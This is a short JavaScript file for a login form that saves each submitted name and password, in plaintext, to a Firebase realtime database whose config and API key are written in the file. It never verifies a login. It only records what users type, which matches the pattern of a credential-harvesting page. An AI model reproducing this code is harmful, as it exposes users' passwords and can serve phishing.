const firebaseConfig = {
    apiKey: "AIzaSyAxlB0O-rfqCqA1Mp06pfMIeNyCVJmj7dI",
    authDomain: "loginpage-49a27.firebaseapp.com",
    databaseURL: "https://loginpage-49a27-default-rtdb.firebaseio.com",
    projectId: "loginpage-49a27",
    storageBucket: "loginpage-49a27.appspot.com",
    messagingSenderId: "134163927286",
    appId: "1:134163927286:web:dec02f13744b6dc0069cd7",
    measurementId: "G-ZKNSYR7RV0"
  };
  //initiate firebase
  firebase.initializeApp(firebaseConfig);
  //reference your database
  var LoginpageDB = firebase.database().ref('Loginpage');
  document.getElementById('Loginpage').addEventListener('submit',submitForm);
 function submitForm(e){
    e.preventDefault();
    var NAME = getElementVal('NAME');
    var PASSWORD = getElementVal('PASSWORD');
    saveMessages(NAME,PASSWORD);
      //enabel alert
    document.querySelector("p#sid").style.background = "#4d6a2c5c";
  //remove the alert
    setTimeout(() =>{
        document.querySelector("p#sid").style.background ="none";
    },1000);
    //reset the form
    document.getElementById("Loginpage").reset(NAME,PASSWORD);
 }
 const saveMessages = (NAME,PASSWORD)=>{
    var newLoginpage = LoginpageDB.push();
    newLoginpage.set({
        NAME :NAME,
        PASSWORD :PASSWORD,
    });
 }

const getElementVal = (id) => {
    return document.getElementById(id).value
}